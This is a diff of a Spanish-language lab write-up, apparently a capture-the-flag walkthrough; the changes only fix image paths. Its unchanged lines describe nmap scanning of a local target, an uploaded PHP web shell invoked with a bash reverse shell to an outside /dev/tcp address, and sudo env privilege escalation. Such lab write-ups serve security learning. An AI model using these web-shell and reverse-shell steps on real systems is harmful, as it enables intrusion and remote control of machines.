@@ -6,7 +6,7 @@ ____
 ping -c 1 172.17.0.2
 ```
 
-![Pasted image 20251030055947](Hacking-repo-obs/Anexos/Pasted%20image%2020251030055947.png)
+![Pasted image 20251030055947](../../../../Anexos/Pasted%20image%2020251030055947.png)
 
 Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
 
@@ -16,7 +16,7 @@ nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
 
 Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:
 
-![Pasted image 20251030060016](Hacking-repo-obs/Anexos/Pasted%20image%2020251030060016.png)
+![Pasted image 20251030060016](../../../../Anexos/Pasted%20image%2020251030060016.png)
 
 Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:
 
@@ -58,6 +58,6 @@ http://172.17.0.2/uploads/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.7
 
 Ahora que ya estamos dentro de la máquina, ejecutando sudo -l vemos que podemos ejecutar el binario env como sudo, así que buscamos en GTFObins para escalar privilegios:
 
-![Pasted image 20251030063336](Hacking-repo-obs/Anexos/Pasted%20image%2020251030063336.png)
+![Pasted image 20251030063336](../../../../Anexos/Pasted%20image%2020251030063336.png)
 
 ![Pasted image 20251030063402.png](Pasted%20image%2020251030063402.png)
